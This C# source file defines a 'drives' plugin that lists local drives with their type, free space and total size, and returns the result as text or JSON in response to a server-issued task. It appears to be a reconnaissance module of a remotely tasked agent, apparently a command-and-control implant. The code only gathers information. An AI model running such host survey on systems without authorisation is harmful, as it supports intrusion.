using Workflow.Contracts;
using System.Text.Json;
using Workflow.Models;
using System.Text;

namespace Workflow
{
    public class DriveObject
    {
        public string DriveName { get; set; } = string.Empty;
        public string DriveType { get; set; } = string.Empty;
        public long FreeSpace { get; set; }
        public long TotalSpace { get; set; }
    }
    public class Plugin : IModule
    {
        public string Name => "drives";
        private IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private IServiceConfig config { get; set; }
        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.logger = context.Logger;
            this.config = context.Config;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                string output = String.Empty;
                if (this.config.prettyOutput)
                {
                    DebugLog.Log($"{Name} using JSON output [{job.task.id}]");
                    output = getJsonOutput(DriveInfo.GetDrives());
                }
                else
                {
                    DebugLog.Log($"{Name} using basic output [{job.task.id}]");
                    output = getBasicOutput(DriveInfo.GetDrives());
                }
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = output,
                    completed = true
                });
                DebugLog.Log($"{Name} completed [{job.task.id}]");
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error [{job.task.id}]: {e.Message}");
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = e.ToString(),
                    completed = true
                });
            }
        }

        private string getBasicOutput(DriveInfo[] drives)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Name\t\t\t\tType\t\t\t\tFree Space\t\t\t\t TotalSize");
            foreach (var drive in drives)
            {
                sb.AppendLine(drive.Name + "\t\t\t\t" + drive.DriveType + "\t\t\t\t" + (drive.TotalFreeSpace / 1000000000).ToString() + "\t\t\t\t" + (drive.TotalSize / 1000000000).ToString());
            }
            return sb.ToString();
        }

        private string getJsonOutput(DriveInfo[] drives)
        {
            List<DriveObject> driveOutput = new List<DriveObject>();

            foreach (var drive in drives)
            {
                try
                {
                    driveOutput.Add(new DriveObject()
                    {
                        DriveName = drive.Name,
                        DriveType = drive.DriveType.ToString(),
                        FreeSpace = drive.TotalFreeSpace / 1000000000,
                        TotalSpace = drive.TotalSize / 1000000000
                    });
                }
                catch
                {

                }
            }

            return JsonSerializer.Serialize(driveOutput);
        }
    }
}
